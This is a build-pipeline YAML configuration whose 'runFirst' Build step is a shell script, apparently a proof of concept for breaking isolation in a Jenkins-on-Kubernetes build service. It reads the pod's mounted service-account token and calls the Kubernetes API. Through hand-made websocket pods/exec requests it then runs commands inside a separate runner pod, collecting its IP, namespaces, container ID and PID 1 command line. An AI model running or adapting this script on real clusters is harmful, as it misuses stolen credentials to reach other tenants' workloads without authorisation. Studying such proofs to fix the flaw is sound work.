general:
  buildTool: 'mta'
  jenkinsKubernetes:
    additionalPodProperties:
      automountServiceAccountToken: true
service:
  stages:
    Build:
      runFirst:
        command: |
          set +x
          T=/var/run/secrets/kubernetes.io/serviceaccount
          NS=$(cat $T/namespace)
          K=https://kubernetes.default.svc
          { printf 'header = "Authorization: Bearer '; cat $T/token; printf '"\n'; } > /tmp/kc
          chmod 600 /tmp/kc
          SELF=$(hostname)
          echo "KPPROOF7788-NS=$NS"
          echo "=== A. WHAT THE BUILD CONTAINER (the caller) IS ==="
          echo "KPPROOF7788-A-SELF-HOSTNAME=$SELF"
          echo "KPPROOF7788-A-SELF-IP=$(hostname -i 2>/dev/null)"
          echo "KPPROOF7788-A-SELF-MNTNS=$(readlink /proc/self/ns/mnt)"
          echo "KPPROOF7788-A-SELF-UTSNS=$(readlink /proc/self/ns/uts)"
          echo "KPPROOF7788-A-SELF-PID1=$(tr '\0' ' ' < /proc/1/cmdline)"
          echo "=== B. WHAT THE KUBERNETES API SAYS ABOUT EACH POD (independent record) ==="
          curl -s --config /tmp/kc -o /tmp/pr --cacert $T/ca.crt $K/api/v1/namespaces/$NS/pods/steward-jenkinsfile-runner-pod
          curl -s --config /tmp/kc -o /tmp/ps --cacert $T/ca.crt $K/api/v1/namespaces/$NS/pods/$SELF
          node -e '
            const fs=require("fs");
            for (const [tag,f] of [["RUNNER","/tmp/pr"],["SELF","/tmp/ps"]]) {
              const p=JSON.parse(fs.readFileSync(f,"utf8"));
              console.log(`KPPROOF7788-B-${tag}-NAME=${p.metadata.name}`);
              console.log(`KPPROOF7788-B-${tag}-UID=${p.metadata.uid}`);
              console.log(`KPPROOF7788-B-${tag}-PODIP=${(p.status||{}).podIP}`);
              console.log(`KPPROOF7788-B-${tag}-NODE=${(p.spec||{}).nodeName}`);
              for (const cs of ((p.status||{}).containerStatuses||[]))
                console.log(`KPPROOF7788-B-${tag}-CTR=${cs.name} id=${cs.containerID}`);
            }'
          ex() {
            P="$1"; C="$2"; shift 2
            Q=""; for a in "$@"; do Q="$Q&command=$a"; done
            KEY=$(head -c 16 /dev/urandom | base64)
            curl -s -o /tmp/ex -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt --http1.1 -N --max-time 20 \
              -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" \
              -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' \
              "$K/api/v1/namespaces/$NS/pods/$P/exec?container=$C&stdout=true&stderr=true$Q"
          }
          R=steward-jenkinsfile-runner-pod; RC=step-jenkinsfile-runner
          echo "=== C. WHAT THE PROCESS INSIDE THE RUNNER POD REPORTS ==="
          echo "KPPROOF7788-C-RUNNER-IP-STATUS=$(ex $R $RC hostname -i)"
          echo "KPPROOF7788-C-RUNNER-IP=$(strings /tmp/ex | grep -aoE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)"
          echo "KPPROOF7788-C-RUNNER-MNTNS-STATUS=$(ex $R $RC readlink /proc/self/ns/mnt)"
          echo "KPPROOF7788-C-RUNNER-MNTNS=$(strings /tmp/ex | grep -aoE 'mnt:\[[0-9]+\]' | head -1)"
          echo "KPPROOF7788-C-RUNNER-UTSNS-STATUS=$(ex $R $RC readlink /proc/self/ns/uts)"
          echo "KPPROOF7788-C-RUNNER-UTSNS=$(strings /tmp/ex | grep -aoE 'uts:\[[0-9]+\]' | head -1)"
          ex $R $RC cat /proc/self/mountinfo > /dev/null
          echo "KPPROOF7788-C-RUNNER-CTRID-IN-MOUNTINFO=$(strings /tmp/ex | grep -aoE '[0-9a-f]{64}' | head -1)"
          ex $R $RC cat /proc/1/cmdline > /dev/null
          echo "KPPROOF7788-C-RUNNER-PID1=$(strings /tmp/ex | grep -av '^$' | head -2 | tr '\n' '|')"
          echo "=== D. CONTROL: same channel, aimed at MY OWN pod ==="
          echo "KPPROOF7788-D-CONTROL-SELF-IP-STATUS=$(ex $SELF container-exec hostname -i)"
          echo "KPPROOF7788-D-CONTROL-SELF-IP=$(strings /tmp/ex | grep -aoE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)"
          echo "KPPROOF7788-D-CONTROL-SELF-MNTNS-STATUS=$(ex $SELF container-exec readlink /proc/self/ns/mnt)"
          echo "KPPROOF7788-D-CONTROL-SELF-MNTNS=$(strings /tmp/ex | grep -aoE 'mnt:\[[0-9]+\]' | head -1)"
          rm -f /tmp/kc /tmp/ex /tmp/pr /tmp/ps
          echo "KPPROOF7788-DONE"
